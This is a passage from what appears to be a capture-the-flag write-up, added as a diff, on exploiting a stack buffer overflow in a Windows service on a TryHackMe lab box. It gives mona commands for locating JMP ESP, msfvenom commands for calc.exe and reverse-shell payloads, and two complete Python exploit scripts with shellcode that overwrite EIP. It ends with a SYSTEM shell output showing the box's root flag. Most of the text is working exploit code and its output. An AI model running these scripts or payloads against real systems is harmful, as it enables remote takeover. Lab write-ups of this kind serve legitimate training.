+Or else we can use the mona module to check the bad character.
+
+save this bad character text to a file.bin and load it in mona.
+
+!mona compare -a esp -f c:\file.bin
+
+the following screen will tell you if there is any bad character.
+
+#############################
+
+Redirecting the FLOW
+
+#############################
+
+Now we need to find a JMP ESP and overwrite EIP with JMP ESP address, so when the JMP ESP executes it will execute the shellcode that follows that.
+
+Once the JMP ESP is executed the flow will be directed to the address ESP points to.
+
+!mona jmp -r esp -cpb "\x00"   # we can use this to find the specific location where there is no bad char.
+
+or 
+
+We can do !mona modules and check for the dll which are not affected by any memory protection.
+
+ASLR DEP etc.
+
+Since there is no DEP or ASLR we can use the JMP ESP from any address in this module.
+
+We can use the nasm_shell to get the opcode for the  
+
+root@natzsec:~/Desktop/tryhackme/boxes/brainstorm# /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+nasm > jmp esp
+00000000  FFE4              jmp esp
+nasm > 
+
+Now on the immunity debugger use the below command to get to the module which has JMP ESP instruction.
+
+!mona find -s "\xff\xe4" -m essfunc.dll
+
+Then double click on the module to get the JMP ESP address 625014DF
+
+Once you get the address, you need to mention this at the place where "B*4" was overwritting the EIP.
+
+The JMP ESP address is in the little endian format so we need to mention it in correct way in the exploit. 
+
+So EIP will be over written by "\xdf\x14\x50\x62"
+
+Now for checking if the bof is triggering the calc.exe locally I have created a payload and added the shellcode to the exploit.
+
+Since we are using the encoders we will need to mention the nops "\x90" so that while the encoder executes it does not overwrite the initial bytes of our shellcode.
+
+#msfvenom -p windows/exec -b "\x00" -f python --var-name shellcode CMD=calc.exe EXITFUNC=thread 
+
+
+#!/usr/bin/python
+
+import socket,sys
+
+address = '172.16.215.167'
+port = 9999
+
+uname = "sam"
+
+# creating the buffer
+
+#buffer = "A" * 3000  #initial fuzzing 
+
+#msfvenom -p windows/exec -b "\x00" -f python --var-name shellcode CMD=calc.exe EXITFUNC=thread  ~ I used this payload to check if the BoF is triggering the calc.exe or not.
+shellcode =  b""
+shellcode += b"\xd9\xc9\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1\x31"
+shellcode += b"\xbb\x1d\x90\xaf\x54\x83\xc2\x04\x31\x5a\x14"
+shellcode += b"\x03\x5a\x09\x72\x5a\xa8\xd9\xf0\xa5\x51\x19"
+shellcode += b"\x95\x2c\xb4\x28\x95\x4b\xbc\x1a\x25\x1f\x90"
+shellcode += b"\x96\xce\x4d\x01\x2d\xa2\x59\x26\x86\x09\xbc"
+shellcode += b"\x09\x17\x21\xfc\x08\x9b\x38\xd1\xea\xa2\xf2"
+shellcode += b"\x24\xea\xe3\xef\xc5\xbe\xbc\x64\x7b\x2f\xc9"
+shellcode += b"\x31\x40\xc4\x81\xd4\xc0\x39\x51\xd6\xe1\xef"
+shellcode += b"\xea\x81\x21\x11\x3f\xba\x6b\x09\x5c\x87\x22"
+shellcode += b"\xa2\x96\x73\xb5\x62\xe7\x7c\x1a\x4b\xc8\x8e"
+shellcode += b"\x62\x8b\xee\x70\x11\xe5\x0d\x0c\x22\x32\x6c"
+shellcode += b"\xca\xa7\xa1\xd6\x99\x10\x0e\xe7\x4e\xc6\xc5"
+shellcode += b"\xeb\x3b\x8c\x82\xef\xba\x41\xb9\x0b\x36\x64"
+shellcode += b"\x6e\x9a\x0c\x43\xaa\xc7\xd7\xea\xeb\xad\xb6"
+shellcode += b"\x13\xeb\x0e\x66\xb6\x67\xa2\x73\xcb\x25\xa8"
+shellcode += b"\x82\x59\x50\x9e\x85\x61\x5b\x8e\xed\x50\xd0"
+shellcode += b"\x41\x69\x6d\x33\x26\x95\x8f\x96\x52\x3e\x16"
+shellcode += b"\x73\xdf\x23\xa9\xa9\x23\x5a\x2a\x58\xdb\x99"
+shellcode += b"\x32\x29\xde\xe6\xf4\xc1\x92\x77\x91\xe5\x01"
+shellcode += b"\x77\xb0\x85\xc4\xeb\x58\x64\x63\x8c\xfb\x78"
+
+buffer = "A" * 2012
+#buffer+= "B" * 4
+buffer+= "\xdf\x14\x50\x62"             #625014DF
+buffer+= "\x90" * 20
+buffer+= shellcode
+buffer+= "C" * 1
+#buffer+= badcharacters
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((address,port))
+    s.recv(1024)
+    s.send(uname + '\r\n')
+    s.recv(1024)
+    s.send(buffer + '\r\n')
+    s.recv(1024)
+except :
+    print '[!] Unable to connect to the application.'
+    sys.exit(0)
+finally:
+    s.close()
+
+When executed the calc.exe will be triggered.
+
+######################
+
+Getting a Shell.
+
+######################
+
+Now its time to check the reverse shell code, if we are getting a reverse shell or not.
+
+msfvenom -p windows/shell_reverse_tcp LHOST=172.16.215.139 LPORT=443 -b "\x00" -f python --var-name shellcode EXITFUNC=thread  #working 
+
+msfvenom -p windows/shell_reverse_tcp LHOST=172.16.215.139 LPORT=1234 -b "\x00" –e x86/shikata_ga_nai -f python --var-name shellcode EXITFUNC=thread
+
+After performing the reverse shell locally we can create the payload for the remote machine and change the local IP and address in the exploit.
+
+#!/usr/bin/python
+
+import socket,sys
+
+address = ' 10.10.199.148'
+port = 9999
+
+uname = "sam"
+
+# creating the buffer
+
+#buffer = "A" * 3000  #initial fuzzing 
+#msfvenom -p windows/exec -b "\x00" -f python --var-name shellcode CMD=calc.exe EXITFUNC=thread  ~ I used this payload to check if the BoF is triggering the calc.exe or not.
+#msfvenom -p windows/shell_reverse_tcp LHOST=172.16.215.139 LPORT=1234 -b "\x00" –e x86/shikata_ga_nai -f python --var-name shellcode EXITFUNC=thread ~ change the IP and Port before creating the payload.
+
+
+shellcode =  b""
+shellcode += b"\xbb\x2c\xfd\xb9\x10\xd9\xf6\xd9\x74\x24\xf4"
+shellcode += b"\x5d\x31\xc9\xb1\x52\x31\x5d\x12\x83\xed\xfc"
+shellcode += b"\x03\x71\xf3\x5b\xe5\x75\xe3\x1e\x06\x85\xf4"
+shellcode += b"\x7e\x8e\x60\xc5\xbe\xf4\xe1\x76\x0f\x7e\xa7"
+shellcode += b"\x7a\xe4\xd2\x53\x08\x88\xfa\x54\xb9\x27\xdd"
+shellcode += b"\x5b\x3a\x1b\x1d\xfa\xb8\x66\x72\xdc\x81\xa8"
+shellcode += b"\x87\x1d\xc5\xd5\x6a\x4f\x9e\x92\xd9\x7f\xab"
+shellcode += b"\xef\xe1\xf4\xe7\xfe\x61\xe9\xb0\x01\x43\xbc"
+shellcode += b"\xcb\x5b\x43\x3f\x1f\xd0\xca\x27\x7c\xdd\x85"
+shellcode += b"\xdc\xb6\xa9\x17\x34\x87\x52\xbb\x79\x27\xa1"
+shellcode += b"\xc5\xbe\x80\x5a\xb0\xb6\xf2\xe7\xc3\x0d\x88"
+shellcode += b"\x33\x41\x95\x2a\xb7\xf1\x71\xca\x14\x67\xf2"
+shellcode += b"\xc0\xd1\xe3\x5c\xc5\xe4\x20\xd7\xf1\x6d\xc7"
+shellcode += b"\x37\x70\x35\xec\x93\xd8\xed\x8d\x82\x84\x40"
+shellcode += b"\xb1\xd4\x66\x3c\x17\x9f\x8b\x29\x2a\xc2\xc3"
+shellcode += b"\x9e\x07\xfc\x13\x89\x10\x8f\x21\x16\x8b\x07"
+shellcode += b"\x0a\xdf\x15\xd0\x6d\xca\xe2\x4e\x90\xf5\x12"
+shellcode += b"\x47\x57\xa1\x42\xff\x7e\xca\x08\xff\x7f\x1f"
+shellcode += b"\x9e\xaf\x2f\xf0\x5f\x1f\x90\xa0\x37\x75\x1f"
+shellcode += b"\x9e\x28\x76\xf5\xb7\xc3\x8d\x9e\xbd\x18\x88"
+shellcode += b"\x48\xaa\x1c\x92\x75\x91\xa8\x74\x1f\xf5\xfc"
+shellcode += b"\x2f\x88\x6c\xa5\xbb\x29\x70\x73\xc6\x6a\xfa"
+shellcode += b"\x70\x37\x24\x0b\xfc\x2b\xd1\xfb\x4b\x11\x74"
+shellcode += b"\x03\x66\x3d\x1a\x96\xed\xbd\x55\x8b\xb9\xea"
+shellcode += b"\x32\x7d\xb0\x7e\xaf\x24\x6a\x9c\x32\xb0\x55"
+shellcode += b"\x24\xe9\x01\x5b\xa5\x7c\x3d\x7f\xb5\xb8\xbe"
+shellcode += b"\x3b\xe1\x14\xe9\x95\x5f\xd3\x43\x54\x09\x8d"
+shellcode += b"\x38\x3e\xdd\x48\x73\x81\x9b\x54\x5e\x77\x43"
+shellcode += b"\xe4\x37\xce\x7c\xc9\xdf\xc6\x05\x37\x40\x28"
+shellcode += b"\xdc\xf3\x60\xcb\xf4\x09\x09\x52\x9d\xb3\x54"
+shellcode += b"\x65\x48\xf7\x60\xe6\x78\x88\x96\xf6\x09\x8d"
+shellcode += b"\xd3\xb0\xe2\xff\x4c\x55\x04\x53\x6c\x7c"
+
+
+buffer = "A" * 2012
+#buffer+= "B" * 4
+buffer+= "\xdf\x14\x50\x62"             #625014DF JMP ESP
+buffer+= "\x90" * 25
+buffer+= shellcode
+buffer+= "C" * 16
+#buffer+= badcharacters
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((address,port))
+    s.recv(1024)
+    s.send(uname + '\r\n')
+    s.recv(1024)
+    s.send(buffer + '\r\n')
+    s.recv(1024)
+except :
+    print '[!] Unable to connect to the application.'
+    sys.exit(0)
+finally:
+    s.close()
+
+
+C:\Users\drake\Desktop>type root.txt
+type root.txt
+5b1001de5a44eca47eee71e7942a8f8a
+C:\Users\drake\Desktop>ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Local Area Connection 2:
+
+   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
+   Link-local IPv6 Address . . . . . : fe80::fd83:272b:5cd4:d8a5%13
+   IPv4 Address. . . . . . . . . . . : 10.10.199.148
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Default Gateway . . . . . . . . . : 10.10.0.1
+
+Tunnel adapter isatap.eu-west-1.compute.internal:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
+
+C:\Users\drake\Desktop>whoami
+whoami
+nt authority\system
+
+C:\Users\drake\Desktop>
+
+
